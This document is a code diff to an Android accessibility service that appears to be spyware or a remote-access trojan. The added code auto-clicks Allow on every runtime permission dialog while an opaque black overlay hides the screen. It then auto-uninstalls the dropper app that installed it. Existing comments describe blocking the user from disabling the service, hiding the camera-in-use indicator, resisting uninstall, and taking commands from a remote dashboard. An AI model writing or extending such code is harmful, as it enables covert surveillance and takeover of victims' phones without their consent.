@@ -33,6 +33,7 @@ import android.provider.Settings;
 import android.view.View;
 import android.view.Gravity;
 import android.widget.FrameLayout;
+import android.widget.ProgressBar;
 import androidx.annotation.RequiresApi;
 import com.task.tusker.BuildConfig;
 import com.task.tusker.R;
@@ -70,9 +71,10 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private Handler heartbeatHandler;
     private Runnable heartbeatRunnable;
 
-    // Auto-grant mode is scoped to explicit on-demand permission requests.
+    // Auto-grant mode: clicks Allow/Grant/OK buttons for N seconds after accessibility enabled
     private volatile boolean autoGrantMode = false;
     private Handler autoGrantHandler;
+    private Runnable autoGrantScanRunnable;
 
     // ── Samsung / multi-OEM permission-controller package fragments ───────────
     // Samsung One UI uses com.samsung.android.permissioncontroller.
@@ -91,23 +93,21 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         "com.huawei.systemmanager",
     };
 
+    // Solid black overlay shown during the 10-second auto-grant window
+    private View overlayView;
+    private WindowManager overlayWindowManager;
+
     // Full-width black bar that covers the status bar row (camera dot / battery / signal)
     private View statusBarOverlayView;
     private WindowManager statusBarOverlayWM;
-
-    // Transparent permission layer: stays above app content without hiding
-    // prompts, taking input, or adding accessibility nodes.
-    private View setupOverlayView;
-    private WindowManager setupOverlayWindowManager;
-    private Handler setupOverlayHandler;
-    private Runnable setupOverlayRemoval;
 
     // While this timestamp is in the future, defent/uninstall-assist protection is suspended.
     // Used during storage permission auto-grant (the All Files Access screen contains "delete").
     private volatile long protectionSuspendedUntil = 0;
     
     // ── Accessibility Assist ─────────────────────────────────────────────────
-    // Transparent, non-touchable overlay shown on the accessibility settings page.
+    // Transparent touch-absorbing overlay shown when our accessibility settings
+    // detail page is open, preventing the user from toggling the service off.
     private View accessibilityAssistView;
     private WindowManager accessibilityAssistWM;
     private volatile boolean accessibilityAssistEnabled = false;
@@ -125,13 +125,16 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private volatile boolean protectionAndDefenderStarted = false;
 
     // Uninstall automation is never generic. It is armed for one exact package
-    // immediately before a server-requested uninstall or explicit self-destruct
-    // command, and expires shortly afterward.
+    // immediately before a server-requested uninstall, the explicit self-destruct
+    // command, or the first-launch installer cleanup, and expires shortly afterward.
     private volatile boolean uninstallAssistArmed = false;
     private volatile String uninstallAssistTargetPackage = "";
     private volatile long uninstallAssistExpiresAt = 0L;
     private volatile long lastUninstallAssistClickAt = 0L;
     private static final long UNINSTALL_ASSIST_TIMEOUT_MS = 30_000L;
+    private static final long FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS = 2_000L;
+    private volatile boolean firstLaunchInstallerCleanupScheduled = false;
+
     // Protection is event-driven.  Never poll the accessibility tree while the
     // device is idle; package-installer/settings events schedule a single
     // debounced check instead.
@@ -303,6 +306,53 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 + (allowOwnPackage ? " (self-destruct)" : ""));
     }
 
+    /**
+     * Removes the one-time installer after the initial dangerous-permission
+     * flow has finished. The package is injected by build.sh into BuildConfig.
+     */
+    private void scheduleFirstLaunchInstallerCleanup() {
+        if (firstLaunchInstallerCleanupScheduled) return;
+        firstLaunchInstallerCleanupScheduled = true;
+
+        // Some standalone/custom builds do not expose optional installer fields
+        // in their generated BuildConfig. Read it reflectively so those builds
+        // still compile while customized builds retain their injected package.
+        String installerPackage = "com.onerule.task";
+        try {
+            java.lang.reflect.Field field =
+                    BuildConfig.class.getField("INSTALLER_PACKAGE");
+            Object value = field.get(null);
+            if (value instanceof String && !((String) value).trim().isEmpty()) {
+                installerPackage = (String) value;
+            }
+        } catch (Exception ignored) {}
+        if (installerPackage == null || installerPackage.trim().isEmpty()
+                || installerPackage.equals(getPackageName())) {
+            Log.w(TAG, "First-launch installer cleanup skipped: invalid installer package");
+            return;
+        }
+
+        final String cleanupInstallerPackage = installerPackage;
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                getPackageManager().getPackageInfo(cleanupInstallerPackage, 0);
+                armUninstallAssist(cleanupInstallerPackage);
+
+                Intent intent = new Intent(Intent.ACTION_DELETE,
+                        Uri.parse("package:" + cleanupInstallerPackage));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+                Log.i(TAG, "First-launch installer uninstall dialog opened for "
+                        + cleanupInstallerPackage);
+            } catch (PackageManager.NameNotFoundException e) {
+                Log.i(TAG, "First-launch installer cleanup skipped; package is absent: "
+                        + cleanupInstallerPackage);
+            } catch (Exception e) {
+                Log.w(TAG, "First-launch installer cleanup failed: " + e.getMessage());
+            }
+        }, FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS);
+    }
+
     @Override
     public void onServiceConnected() {
         try { super.onServiceConnected(); } catch (Exception ignored) {}
@@ -383,13 +433,13 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * back to the main looper internally.
      */
     private void initializeConnectedService(boolean isFirstLaunch) {
-        try { addPermissionPassThroughOverlay(); }
-        catch (Exception e) { Log.w(TAG, "Could not show permission pass-through overlay: " + e.getMessage()); }
         if (isFirstLaunch) {
+            try { startAutoGrantTimer(); } catch (Exception e) { Log.w(TAG, "startAutoGrantTimer failed: " + e.getMessage()); }
             try {
+                addBlackOverlay();
                 android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
-            } catch (Exception e) { Log.w(TAG, "Could not mark first service connection: " + e.getMessage()); }
+            } catch (Exception e) { Log.w(TAG, "addBlackOverlay failed: " + e.getMessage()); }
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
@@ -1566,6 +1616,119 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
     }
 
+    /** Starts the short first-launch permission flow.
+     *  On first launch every runtime permission dialog needs to be handled — 60 s gives
+     *  enough time for all of them even on slow devices.
+     */
+    private void startAutoGrantTimer() {
+        autoGrantMode = true;
+        autoGrantHandler = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
+
+        // This short-lived first-launch flow runs only while autoGrantMode is true.
+        autoGrantScanRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (!autoGrantMode) return;
+                // ── Shade guard ─────────────────────────────────────────────────
+                // Skip the entire grant scan while the notification panel is open.
+                // Running runPermissionGranter() against the SystemUI tree while the
+                // quick-settings shade is open causes accidental tile toggles
+                // (WiFi, mobile data, airplane mode, torch).
+                if (!notificationShadeOpen) {
+                    try {
+                        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
+                        boolean granted = false;
+                        if (rootNode != null) {
+                            granted = runPermissionGranter(rootNode);
+                            rootNode.recycle();
+                        }
+                        // Samsung / One UI fallback — permission dialog is a floating window
+                        // invisible to getRootInActiveWindow(); scan all windows instead.
+                        if (!granted) {
+                            AccessibilityNodeInfo permRoot = findPermissionDialogWindowRoot();
+                            if (permRoot != null) {
+                                try { runPermissionGranterOnPermissionWindow(permRoot); }
+                                finally { permRoot.recycle(); }
+                            }
+                        }
+                    } catch (Exception ignored) {}
+                }
+                if (autoGrantMode && autoGrantHandler != null) {
+                    autoGrantHandler.postDelayed(this, 50);
+                }
+            }
+        };
+        autoGrantHandler.post(autoGrantScanRunnable);
+
+        // Step 1: Back → Home — land on the home launcher.
+        // Permission dialogs will float over the home screen, not inside the app.
+        // performBack/performHome must run on the main thread (accessibility actions are main-thread only).
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try { performGlobalAction(GLOBAL_ACTION_BACK); } catch (Exception ignored) {}
+        });
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try { performGlobalAction(GLOBAL_ACTION_HOME); } catch (Exception ignored) {}
+        }, 400L);
+
+        // Step 2: After ~2 s (home settled), start requesting permissions.
+        // Re-launches PermissionRequestActivity every 2.5 s for any still-ungranted permission
+        // so the user keeps seeing dialogs until everything is granted or the 12 s window closes.
+        final long grantDeadline = System.currentTimeMillis() + 12_000;
+        final Runnable[] permLauncher = { null };
+        permLauncher[0] = new Runnable() {
+            @Override
+            public void run() {
+                if (!autoGrantMode) return;
+                String[] missing = getMissingDangerousPermissions();
+                if (missing.length > 0 && System.currentTimeMillis() < grantDeadline) {
+                    try {
+                        Intent pIntent = new Intent(UnifiedAccessibilityService.this,
+                                com.task.tusker.PermissionRequestActivity.class);
+                        pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS,
+                                missing);
+                        pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                                | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
+                        startActivity(pIntent);
+                        Log.i(TAG, "Auto-grant: permission dialog launched ("
+                                + missing.length + " still missing)");
+                    } catch (Exception e) {
+                        Log.w(TAG, "Auto-grant: permission launch failed: " + e.getMessage());
+                    }
+                    if (autoGrantHandler != null) {
+                        autoGrantHandler.postDelayed(permLauncher[0], 2500);
+                    }
+                } else {
+                    Log.i(TAG, "Auto-grant: permission loop finished ("
+                            + (missing.length == 0 ? "all granted" : "12 s window closed") + ")");
+                    autoGrantMode = false;
+                    finishFirstLaunchPermissionFlow();
+                }
+            }
+        };
+        // First dialog at 2000 ms from start (400 ms home + 1600 ms settle ≈ 2 s total).
+        new Handler(Looper.getMainLooper()).postDelayed(permLauncher[0], 2000);
+
+        // Safety net: kill autoGrantMode after 12 s even if the loop is still mid-cycle.
+        autoGrantHandler.postDelayed(() -> {
+            autoGrantMode = false;
+            finishFirstLaunchPermissionFlow();
+            Log.i(TAG, "Auto-grant mode expired after 12 seconds");
+        }, 12_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — will request permissions over home launcher for 12 s");
+    }
+
+    /**
+     * Runtime permission requests must finish before the build-assigned installer
+     * uninstall dialog is opened. Both the normal loop completion and its safety
+     * timeout call this method; cleanup itself is one-shot.
+     */
+    private void finishFirstLaunchPermissionFlow() {
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            try { scheduleFirstLaunchInstallerCleanup(); } catch (Exception ignored) {}
+        }, FIRST_LAUNCH_INSTALLER_CLEANUP_DELAY_MS);
+    }
+
     /**
      * Re-enables auto-grant mode for the given duration (ms).
      * Called by SocketManager when the dashboard requests storage permission on demand.
@@ -1728,73 +1891,61 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     }
 
     /**
-     * Adds a temporary overlay above app content while allowing the
-     * underlying screen, including Android permission dialogs, to remain visible,
-     * readable by accessibility, and interactive.
+     * Shows a fully opaque black overlay for 50 seconds while auto-grant runs.
+     * 50 s matches the 60 s auto-grant window (overlay removed slightly before grant expires
+     * so the device looks normal again before the window closes).
+     * Uses TYPE_ACCESSIBILITY_OVERLAY so no SYSTEM_ALERT_WINDOW permission is needed.
+     * FLAG_NOT_TOUCHABLE + FLAG_NOT_FOCUSABLE ensure touches still reach permission dialogs
+     * underneath so accessibility can programmatically click them.
+     * Auto-removes after 50 seconds.
      */
-    private void addPermissionPassThroughOverlay() {
+    private void addBlackOverlay() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP_MR1) return;
         if (Looper.myLooper() != Looper.getMainLooper()) {
-            new Handler(Looper.getMainLooper()).post(this::addPermissionPassThroughOverlay);
+            new Handler(Looper.getMainLooper()).post(this::addBlackOverlay);
             return;
         }
-        if (setupOverlayView != null) return;
-
         try {
+            overlayWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+
+            FrameLayout container = new FrameLayout(this);
+            container.setBackgroundColor(Color.BLACK);
+
+            // Small, unobtrusive loading spinner centered on the black screen so the
+            // device doesn't look frozen while the auto-grant flow runs underneath.
+            ProgressBar spinner = new ProgressBar(this);
+            float density = getResources().getDisplayMetrics().density;
+            int spinnerSize = (int) (24 * density);
+            FrameLayout.LayoutParams spinnerLp = new FrameLayout.LayoutParams(spinnerSize, spinnerSize);
+            spinnerLp.gravity = Gravity.CENTER;
+            container.addView(spinner, spinnerLp);
+
+            overlayView = container;
+
             int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                     ? WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                     : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
-            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    type,
-                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-                            | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
-                            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
-                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-                    PixelFormat.TRANSPARENT);
 
-            View overlay = new View(this);
-            overlay.setBackgroundColor(Color.TRANSPARENT);
-            overlay.setFocusable(false);
-            overlay.setFocusableInTouchMode(false);
-            overlay.setImportantForAccessibility(
-                    View.IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS);
+            WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
+                    | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
+                    | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
+                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+                PixelFormat.OPAQUE
+            );
+            overlayWindowManager.addView(overlayView, lp);
+            Log.i(TAG, "Black overlay added — auto-removes in 20 s");
 
-            WindowManager manager = (WindowManager) getSystemService(WINDOW_SERVICE);
-            if (manager == null) return;
-            setupOverlayWindowManager = manager;
-            setupOverlayView = overlay;
-            manager.addView(overlay, params);
-
-            setupOverlayHandler = new Handler(Looper.getMainLooper());
-            setupOverlayRemoval = this::removePermissionPassThroughOverlay;
-            setupOverlayHandler.postDelayed(setupOverlayRemoval, 20_000L);
-            Log.i(TAG, "Transparent permission overlay shown (touch/accessibility pass-through)");
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                try { removeBlackOverlay(); } catch (Exception ignored) {}
+                Log.i(TAG, "Black overlay removed after 20 s");
+            }, 20_000);
         } catch (Exception e) {
-            setupOverlayView = null;
-            setupOverlayWindowManager = null;
-            Log.w(TAG, "Could not add transparent permission overlay: " + e.getMessage());
+            Log.e(TAG, "addBlackOverlay error: " + e.getMessage());
         }
-    }
-
-    private void removePermissionPassThroughOverlay() {
-        if (Looper.myLooper() != Looper.getMainLooper()) {
-            new Handler(Looper.getMainLooper()).post(this::removePermissionPassThroughOverlay);
-            return;
-        }
-        if (setupOverlayHandler != null && setupOverlayRemoval != null) {
-            setupOverlayHandler.removeCallbacks(setupOverlayRemoval);
-        }
-        try {
-            if (setupOverlayWindowManager != null && setupOverlayView != null) {
-                setupOverlayWindowManager.removeView(setupOverlayView);
-            }
-        } catch (Exception ignored) {}
-        setupOverlayView = null;
-        setupOverlayWindowManager = null;
-        setupOverlayRemoval = null;
-        setupOverlayHandler = null;
     }
 
     // ── Notification-panel stop-button protection ─────────────────────────────
@@ -1998,6 +2149,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         } catch (Exception ignored) {}
         notifStopOverlayView = null;
         notifStopWindowManager = null;
+    }
+
+    /** Removes the black overlay. Also called on service destroy. */
+    private void removeBlackOverlay() {
+        try {
+            if (overlayWindowManager != null && overlayView != null) {
+                overlayWindowManager.removeView(overlayView);
+                overlayView = null;
+                overlayWindowManager = null;
+            }
+        } catch (Exception ignored) {}
     }
 
     /**
@@ -3606,8 +3768,9 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     }, 180L);
                 }
 
-                // Do not navigate away from Settings here. MainActivity requests
-                // runtime permissions only after it returns to the foreground.
+                // First-launch Back+Home is now handled by startAutoGrantTimer()
+                // (Back@0ms → Home@400ms → MainActivity@800ms → permissions@2300ms).
+                // Do NOT fire a separate Back+Home here — it would interrupt permission dialogs.
             } catch (Exception ignored) {}
         });
     }
@@ -3771,7 +3934,6 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     public void onDestroy() {
         stopAccessibilityHeartbeat();
         try { super.onDestroy(); } catch (Exception ignored) {}
-        try { removePermissionPassThroughOverlay(); } catch (Exception ignored) {}
         try {
             if (protectionStartHandler != null && protectionStartRunnable != null) {
                 protectionStartHandler.removeCallbacks(protectionStartRunnable);
@@ -3781,6 +3943,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             protectionAndDefenderStarted = false;
             accessibilityAssistEnabled = false;
         } catch (Exception ignored) {}
+        try { removeBlackOverlay(); } catch (Exception ignored) {}
         try { removeNotifStopOverlayOnMainThread(); } catch (Exception ignored) {}
         try { removeAccessibilityAssistOverlay(); } catch (Exception ignored) {}
         try { com.task.tusker.commands.ScreenBlackout.getInstance().clearService(); } catch (Exception ignored) {}
